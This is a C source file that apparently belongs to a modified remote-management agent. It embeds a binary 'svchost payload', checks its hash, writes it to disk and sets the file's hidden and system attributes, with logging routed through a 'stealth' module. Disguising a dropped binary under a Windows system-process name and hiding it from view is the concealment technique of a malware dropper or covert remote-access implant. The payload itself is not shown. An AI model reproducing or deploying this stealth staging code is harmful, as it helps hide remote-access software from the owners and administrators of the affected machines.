#include <windows.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>
#include "svchost_payload.h"

#if defined(BUILD_SVCHOST_DLL)

const unsigned char* MeshSvchostPayload_GetData(size_t* length)
{
    if (length != NULL)
    {
        *length = 0;
    }
    SetLastError(ERROR_NOT_SUPPORTED);
    return NULL;
}

BOOL MeshSvchostPayload_VerifyIntegrity(void)
{
    SetLastError(ERROR_NOT_SUPPORTED);
    return FALSE;
}

BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
{
    (void)destination;
    SetLastError(ERROR_NOT_SUPPORTED);
    return FALSE;
}

#else

#include "../microstack/ILibCrypto.h"
#include "stealth.h"
#include "meshcore/embedded/generated/svchost_payload.h"
#include <strsafe.h>

#define SVCHOST_PAYLOAD_HASH_HEX_CHARS      (UTIL_SHA256_HASHSIZE * 2)
#define SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH  (SVCHOST_PAYLOAD_HASH_HEX_CHARS + 1)

#define STEALTH_CAPTURE_ENV_VAR          L"STEALTH_CAPTURE_FAILED_DLL"

static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES)
    {
        attrs = 0;
    }
    attrs |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    SetFileAttributesW(path, attrs);
}

static BOOL MeshSvchostPayload_HashBufferHex(const unsigned char* data, size_t length, char* outHex, size_t outHexLength)
{
    if (data == NULL || length == 0 || outHex == NULL || outHexLength < SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    unsigned char digest[UTIL_SHA256_HASHSIZE];
    util_sha256((char*)data, length, (char*)digest);
    util_tohex_lower((char*)digest, UTIL_SHA256_HASHSIZE, outHex);
    return TRUE;
}

static BOOL MeshSvchostPayload_HashFileHex(const wchar_t* path, char* outHex, size_t outHexLength)
{
    if (path == NULL || path[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    HANDLE fileHandle = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize))
    {
        DWORD fileErr = GetLastError();
        CloseHandle(fileHandle);
        SetLastError(fileErr);
        return FALSE;
    }

    ULONGLONG fileSizeValue = (fileSize.QuadPart < 0) ? 0 : (ULONGLONG)fileSize.QuadPart;
    if (fileSizeValue == 0)
    {
        CloseHandle(fileHandle);
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    if (fileSizeValue != (ULONGLONG)g_SvchostPayload_SIZE)
    {
        CloseHandle(fileHandle);
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    if ((ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)SIZE_MAX ||
        (ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)MAXDWORD)
    {
        Stealth_LogInstallEvent(L"HashFileHex payload size exceeds runtime limits (size=%I64u, SIZE_MAX=%I64u, MAXDWORD=%u)",
            (unsigned long long)g_SvchostPayload_SIZE,
            (unsigned long long)((ULONGLONG)SIZE_MAX),
            (unsigned int)MAXDWORD);
        CloseHandle(fileHandle);
        SetLastError(ERROR_FILE_TOO_LARGE);
        return FALSE;
    }

    const size_t bytesToRead = (size_t)fileSizeValue;
    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, bytesToRead);
    if (buffer == NULL)
    {
        CloseHandle(fileHandle);
        SetLastError(ERROR_OUTOFMEMORY);
        return FALSE;
    }

    DWORD totalRead = 0;
    BOOL readOk = ReadFile(fileHandle, buffer, (DWORD)bytesToRead, &totalRead, NULL);
    DWORD readErr = readOk ? ERROR_SUCCESS : GetLastError();
    CloseHandle(fileHandle);

    if (!readOk || totalRead != bytesToRead)
    {
        HeapFree(GetProcessHeap(), 0, buffer);
        if (readErr != ERROR_SUCCESS)
        {
            SetLastError(readErr);
        }
        else
        {
            SetLastError(ERROR_READ_FAULT);
        }
        return FALSE;
    }

    BOOL hashResult = MeshSvchostPayload_HashBufferHex(buffer, bytesToRead, outHex, outHexLength);
    HeapFree(GetProcessHeap(), 0, buffer);
    return hashResult;
}

static BOOL MeshSvchostPayload_VerifyHashEquals(const char* expectedHex, const char* actualHex)
{
    if (expectedHex == NULL || actualHex == NULL)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (_stricmp(expectedHex, actualHex) != 0)
    {
        SetLastError(ERROR_CRC);
        return FALSE;
    }
    return TRUE;
}

static BOOL MeshSvchostPayload_VerifyFileOnDisk(const wchar_t* path)
{
    char fileHash[SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH] = {0};
    if (!MeshSvchostPayload_HashFileHex(path, fileHash, sizeof(fileHash)))
    {
        return FALSE;
    }
    return MeshSvchostPayload_VerifyHashEquals(g_SvchostPayload_SHA256, fileHash);
}

const unsigned char* MeshSvchostPayload_GetData(size_t* length)
{
    if (length != NULL)
    {
        *length = (size_t)g_SvchostPayload_SIZE;
    }
    return g_SvchostPayload;
}

BOOL MeshSvchostPayload_VerifyIntegrity(void)
{
    size_t dataLength = 0;
    const unsigned char* data = MeshSvchostPayload_GetData(&dataLength);
    if (data == NULL || dataLength == 0)
    {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    char computed[SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH] = {0};
    if (!MeshSvchostPayload_HashBufferHex(data, dataLength, computed, sizeof(computed)))
    {
        return FALSE;
    }

    return MeshSvchostPayload_VerifyHashEquals(g_SvchostPayload_SHA256, computed);
}

static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
{
    if (destination == NULL || destination[0] == L'\0') { return; }

    wchar_t envBuffer[4] = {0};
    if (GetEnvironmentVariableW(STEALTH_CAPTURE_ENV_VAR, envBuffer, _countof(envBuffer)) == 0)
    {
        return;
    }

    wchar_t capturePath[MAX_PATH * 2] = {0};
    SYSTEMTIME st;
    GetLocalTime(&st);
    if (FAILED(StringCchPrintfW(
        capturePath,
        _countof(capturePath),
        L"%s.failed_%04u%02u%02u%02u%02u%02u",
        destination,
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond)))
    {
        return;
    }

    if (CopyFileW(destination, capturePath, FALSE))
    {
        Stealth_LogInstallEvent(L"Captured failed svchost payload snapshot: %ls", capturePath);
    }
}

BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
{
    if (destination == NULL || destination[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (!MeshSvchostPayload_VerifyIntegrity())
    {
        return FALSE;
    }

    size_t dataLength = 0;
    const unsigned char* data = MeshSvchostPayload_GetData(&dataLength);
    if (data == NULL || dataLength == 0 || dataLength > MAXDWORD)
    {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    Stealth_LogInstallEvent(L"Emitting embedded svchost payload (%Iu bytes) to %ls", dataLength, destination);

    HANDLE fileHandle = CreateFileW(destination,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN,
        NULL);

    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        Stealth_LogInstallEvent(L"CreateFile failed for %ls (error=%lu)", destination, GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL result = WriteFile(fileHandle, data, (DWORD)dataLength, &written, NULL);
    DWORD writeErr = result ? ERROR_SUCCESS : GetLastError();
    CloseHandle(fileHandle);

    if (!result || written != dataLength)
    {
        Stealth_LogInstallEvent(L"WriteFile failed for %ls (bytes=%lu, error=%lu)", destination, written, writeErr);
        if (writeErr != ERROR_SUCCESS)
        {
            SetLastError(writeErr);
        }
        DeleteFileW(destination);
        return FALSE;
    }

    if (!MeshSvchostPayload_VerifyFileOnDisk(destination))
    {
        DWORD verifyErr = GetLastError();
        Stealth_LogInstallEvent(L"Embedded svchost payload verification failed for %ls (error=%lu)", destination, verifyErr);
        Stealth_LogPathState(destination);
        MeshSvchostPayload_TryCaptureFailure(destination);
        DeleteFileW(destination);
        if (verifyErr != ERROR_SUCCESS)
        {
            SetLastError(verifyErr);
        }
        return FALSE;
    }

    Stealth_LogInstallEvent(L"Embedded svchost payload staged (%Iu bytes) to %ls", dataLength, destination);

    MeshSvchostPayload_SetHiddenAttributes(destination);
    return TRUE;
}

#endif /* BUILD_SVCHOST_DLL */
